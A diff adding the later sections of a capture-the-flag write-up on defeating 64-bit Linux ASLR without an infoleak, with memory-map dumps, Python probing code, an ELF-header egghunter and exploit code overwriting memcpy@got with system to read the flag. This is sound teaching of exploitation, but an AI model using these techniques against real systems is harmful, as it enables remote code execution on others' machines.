+7fe3c8000000-7fe3cc000000 r--p 00000000 00:af 5                          /challenge/files/1.unkyle
+7fe3cc000000-7fe3d0000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
+7fe3d0000000-7fe3d01a8000 rw-p 00000000 00:00 0
+7fe3d01a8000-7fe3d4000000 ---p 00000000 00:00 0
+
+... Libraries: ...
+
+7fe3d6a1e000-7fe3d6a1f000 r--p 00000000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a1f000-7fe3d6a20000 r-xp 00001000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a20000-7fe3d6a21000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a21000-7fe3d6a22000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a22000-7fe3d6a23000 rw-p 00003000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a23000-7fe3d6a25000 rw-p 00000000 00:00 0
+7fe3d6a25000-7fe3d6a26000 r--p 00000000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a26000-7fe3d6a4d000 r-xp 00001000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a4d000-7fe3d6a57000 r--p 00028000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a57000-7fe3d6a59000 r--p 00031000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a59000-7fe3d6a5b000 rw-p 00033000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+
+...
+
+</code></pre></div></div>
+
+<p>Let’s focus our attention on the addresses created with the memory spraying. (*.unkyle files )</p>
+
+<p>We can try to apply the <a href="#Boundary-cross-trick">boundary cross trick</a>.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>mem</th>
+      <th>4gb boundary cross?</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>7fe2dc000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe2e0000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe2e4000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe2e8000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe2ec000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe2f0000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe2f4000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe2f8000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe2fc000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>7fe300000000</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>7fe304000000</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>7fe308000000</td>
+      <td>Yes</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>By exploiting the change from 7fe2.. to 7fe3.. we can scan memory with a step of 0x100000000 = 4gb memory.</p>
+
+<h2 id="45-finally-defeating-aslr">4.5 Finally defeating ASLR</h2>
+
+<p>Given that step size, we can scan <code class="language-plaintext highlighter-rouge">start=0x7f0000000000</code> to <code class="language-plaintext highlighter-rouge">end=0x800000000000</code> with only <code class="language-plaintext highlighter-rouge">end - start / size</code> = 256 queries.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">start</span> <span class="o">=</span> <span class="mh">0x7f0000000000</span>
+<span class="n">end</span> <span class="o">=</span> <span class="mh">0x800000000000</span> 
+<span class="n">step</span> <span class="o">=</span> <span class="mh">0x100000000</span> <span class="c1"># 4gb
+</span>
+<span class="n">isMapped</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">j</span> <span class="o">=</span> <span class="mh">0xff</span>
+<span class="k">while</span> <span class="n">isMapped</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+    <span class="n">leakAddr</span> <span class="o">=</span> <span class="n">start</span> <span class="o">+</span> <span class="n">j</span><span class="o">*</span><span class="n">step</span>
+    <span class="n">isMapped</span> <span class="o">=</span> <span class="p">(</span><span class="n">isAddrMapped</span><span class="p">(</span><span class="n">leakAddr</span><span class="p">,</span> <span class="mi">1000</span> <span class="o">+</span> <span class="n">j</span><span class="p">))</span>
+    <span class="n">j</span> <span class="o">-=</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<p>At this point, we have <code class="language-plaintext highlighter-rouge">leakAddr</code> which is a mapped address like this: <code class="language-plaintext highlighter-rouge">0x7fXX00000000</code>, in <a href="#memory-spray-result">this</a> case, <code class="language-plaintext highlighter-rouge">leakAddr = 0x7fe300000000</code>.</p>
+
+<p>Now, if we want to follow the saelo technique, we should do a binary search of the range 0x7fXX00000000 - 0x7fXXffffffff, in order to find lower and upper bounds, the problem is that there are some holes in that range, so the binary search fails a lot of times.</p>
+
+<p>You can check yourself with <a href="https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/resources/analyze_mappings.py">this</a> script:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RANGE					SIZE
+
+0x00007f7544000000 - 0x00007f763c000000	0xf8000000
+SMALL GAP				0x00caa000
+0x00007f763ccaa000 - 0x00007f763e358000	0x016ae000
+</code></pre></div></div>
+
+<p>That small gap between 0x00007f763c000000 and 0x00007f763ccaa000 screws up the binary search, of course it is still doable, but i found an easier way.</p>
+
+<h3 id="observation">Observation</h3>
+
+<p>We want to get the last mapped address, because that’s where libraries are mapped.</p>
+
+<p>For example, given those mappings for the libraries:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7fe3d6a1e000-7fe3d6a1f000 r--p 00000000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a1f000-7fe3d6a20000 r-xp 00001000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a20000-7fe3d6a21000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a21000-7fe3d6a22000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a22000-7fe3d6a23000 rw-p 00003000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a23000-7fe3d6a25000 rw-p 00000000 00:00 0
+7fe3d6a25000-7fe3d6a26000 r--p 00000000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a26000-7fe3d6a4d000 r-xp 00001000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a4d000-7fe3d6a57000 r--p 00028000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a57000-7fe3d6a59000 r--p 00031000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a59000-7fe3d6a5b000 rw-p 00033000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+</code></pre></div></div>
+
+<p>We can search for the address <code class="language-plaintext highlighter-rouge">7fe3d6a5b000 - 0x1000</code> with this trick:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>address</th>
+      <th>isAddressMapped?</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0x7fe3f0000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3e0000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d0000000</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>0x7fe3df000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3de000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3dd000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3dc000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3db000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3da000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d9000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d8000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d7000000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6000000</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6f00000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6e00000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6d00000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6c00000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6b00000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a00000</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6af0000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6ae0000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6ad0000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6ac0000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6ab0000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6aa0000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a90000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a80000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a70000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a60000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a50000</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a5f000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a5e000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a5d000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a5c000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a5b000</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fe3d6a5a000</td>
+      <td>Yes</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><code class="language-plaintext highlighter-rouge">lastMappedPage = 0x7fe3d6a5a000</code></p>
+
+<p>We are bruteforcing half byte at a time, for a worst case scenario of 16*5 = 80 queries.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">linearFindLargest</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">increment</span><span class="p">,</span> <span class="n">idstart</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+        <span class="k">print</span> <span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">base</span> <span class="o">+</span> <span class="n">increment</span><span class="o">*</span><span class="n">i</span><span class="si">:</span><span class="c1">#x</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">'</span><span class="se">\t</span><span class="s">|</span><span class="se">\t</span><span class="s">'</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">isAddrMapped</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">increment</span><span class="o">*</span><span class="n">i</span><span class="p">,</span> <span class="n">idstart</span><span class="o">+</span><span class="n">i</span><span class="p">):</span>
+            <span class="k">print</span> <span class="p">(</span><span class="s">'Yes'</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">i</span><span class="o">*</span><span class="n">increment</span>
+        <span class="k">print</span> <span class="p">(</span><span class="s">'No'</span><span class="p">)</span>
+    <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"linearFindLargest should not fail"</span><span class="p">)</span>
+  
+<span class="c1"># Find upper bound, we can't do a binary search because there are some holes which
+# screw things up
+</span><span class="n">lastMappedPage</span> <span class="o">=</span> <span class="n">leakAddr</span>
+<span class="n">lastMappedPage</span> <span class="o">+=</span> <span class="n">linearFindLargest</span><span class="p">(</span><span class="n">lastMappedPage</span><span class="p">,</span> <span class="mh">0x10000000</span><span class="p">,</span> <span class="mi">40000</span><span class="p">)</span>
+<span class="n">lastMappedPage</span> <span class="o">+=</span> <span class="n">linearFindLargest</span><span class="p">(</span><span class="n">lastMappedPage</span><span class="p">,</span> <span class="mh">0x1000000</span><span class="p">,</span> <span class="mi">40100</span><span class="p">)</span>
+<span class="n">lastMappedPage</span> <span class="o">+=</span> <span class="n">linearFindLargest</span><span class="p">(</span><span class="n">lastMappedPage</span><span class="p">,</span> <span class="mh">0x100000</span><span class="p">,</span> <span class="mi">40200</span><span class="p">)</span>
+<span class="n">lastMappedPage</span> <span class="o">+=</span> <span class="n">linearFindLargest</span><span class="p">(</span><span class="n">lastMappedPage</span><span class="p">,</span> <span class="mh">0x10000</span><span class="p">,</span> <span class="mi">40300</span><span class="p">)</span>
+<span class="n">lastMappedPage</span> <span class="o">+=</span> <span class="n">linearFindLargest</span><span class="p">(</span><span class="n">lastMappedPage</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mi">40400</span><span class="p">)</span>
+<span class="k">print</span> <span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">lastMappedPage</span> <span class="o">=</span> <span class="si">:</span><span class="c1">#x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="46-the-exploit">4.6 The exploit</h2>
+
+<p>Finally, we know everything we need about the memory mappings, now it is just a matter of leveraging a write what where primitive into code execution.</p>
+
+<p>To achieve code execution I overwrote libkyle.so’s memcpy@got entry with system@libc.</p>
+
+<h3 id="get-libkyle-base">Get libkyle base</h3>
+<p>Luckily for us libc base and libkyle.so base are at a constant offset from the lastMappedPage, I didn’t know that was the case so I wrote a egghunter which search for <code class="language-plaintext highlighter-rouge">\x7fELF</code> (Header of ELF executables), which in the end wasn’t useful.</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># Scan backwards looking for b'\x7fELF'
+</span>    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">numElf</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">while</span> <span class="n">numElf</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">theAddr</span> <span class="o">=</span> <span class="n">lastMappedPage</span><span class="o">-</span><span class="mh">0x1000</span><span class="o">*</span><span class="n">i</span>
+        <span class="n">hdr</span> <span class="o">=</span> <span class="n">readFromAddr</span><span class="p">(</span><span class="n">theAddr</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">40500</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">i</span><span class="si">:</span><span class="mi">02</span><span class="n">d</span><span class="si">}</span><span class="s">) Elf in </span><span class="si">{</span><span class="n">theAddr</span><span class="si">:</span><span class="c1">#x</span><span class="si">}</span><span class="s">? </span><span class="si">{</span><span class="n">hdr</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">hdr</span> <span class="o">==</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">ELF'</span><span class="p">:</span>
+            <span class="n">numElf</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">print</span> <span class="p">(</span><span class="sa">f</span><span class="s">"found elf at </span><span class="si">{</span><span class="n">theAddr</span><span class="si">:</span><span class="c1">#x</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;</span> <span class="mi">70</span><span class="p">:</span>
+            <span class="k">print</span> <span class="p">(</span><span class="s">"Exploit failed, upper bound address was wrong"</span><span class="p">)</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<h3 id="overwrite-libkyles-memcpygot-and-get-rce">Overwrite libkyle’s memcpy@got and get RCE</h3>
+
+<p>Fortunately overwriting memcpy@got with system was good enough to get the flag and claim that juicy bounty :)</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># exp is a CompressedFile which:
+</span>    <span class="c1"># - writes libc.system to memcpy_got
+</span>    <span class="c1"># - calls memcpy(cmd, 0, 0) -&gt; system(cmd)
+</span>    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"ls;cat flag.txt;</span><span class="se">\x00</span><span class="s">"</span>
+    <span class="n">exp</span> <span class="o">=</span> <span class="n">CompressedFile</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span>
+    
+    <span class="n">exp</span><span class="p">.</span><span class="n">seek</span><span class="p">((</span><span class="n">memcpy_got</span> <span class="o">-</span> <span class="n">OUT_ADDR</span><span class="p">)</span><span class="o">&amp;</span><span class="n">M64</span><span class="p">)</span>
+    <span class="c1"># out=memcpy_got
+</span>    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]):</span>
+        <span class="n">exp</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">([</span><span class="n">b</span><span class="p">]))</span>
+    <span class="c1"># out=memcpy_got+8
+</span>    <span class="c1"># memcpy(out, out-off, size)
+</span>    <span class="c1"># system(out)
+</span>    
+    <span class="n">in_addr_off</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">exp</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">exp</span><span class="p">.</span><span class="n">content</span> <span class="o">+=</span> <span class="n">cmd</span>
+    <span class="n">exp</span><span class="p">.</span><span class="n">seek</span><span class="p">((</span><span class="n">IN_ADDR</span> <span class="o">+</span> <span class="n">in_addr_off</span> <span class="o">-</span> <span class="p">(</span><span class="n">memcpy_got</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span><span class="o">&amp;</span><span class="n">M64</span><span class="p">)</span>
+    <span class="n">exp</span><span class="p">.</span><span class="n">memcpy</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># system(cmd)
+</span>    
+    <span class="n">uploadFile</span><span class="p">(</span><span class="n">exp</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="mi">123001</span><span class="p">)</span>
+    <span class="c1"># profit
+</span>    <span class="n">getFile</span><span class="p">(</span><span class="mi">123001</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="47-the-flag">4.7 The flag!</h2>
+
+<p>You can find the exploit <a href="https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/resources/x.py">here</a>.</p>
+
+<p align="center"><img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/exploit-final.png" /></p>
+<p><br /></p>
+
+<p>There is also an 100% reliable version of the exploit <a href="https://github.com/nick0ve/how-to-bypass-aslr-on-linux-x86_64/blob/main/resources/reliable_exploit.py">here</a>.</p>
+
+<h2 id="5-conclusion">5. Conclusion</h2>
+
+<p>Hope you enjoyed the writeup, if something was not clear enough don’t hesitate to contact me <a href="https://twitter.com/nick0ve">@nick0ve</a> :)</p>
 
   </article>
 </div>
@@ -337,7 +1305,7 @@ ptm<span class="o">{</span>f0rk5_ar3n7_g00d_f0r_cnr13s<span class="o">}</span>
 >
     <span class="text-green-500">fibonhack@templeos</span>
     <p>:</p>
-    <span class="text-blue-400">~/knife</span>
+    <span class="text-blue-400">~/Breaking 64 bit aslr on Linux x86-64 without any infoleak</span>
     <p>$</p>
     <form class="terminal_form flex ml-1 relative">
         <input type="text" spellcheck="false" class="w-full bg-transparent focus:outline-0 border-none">
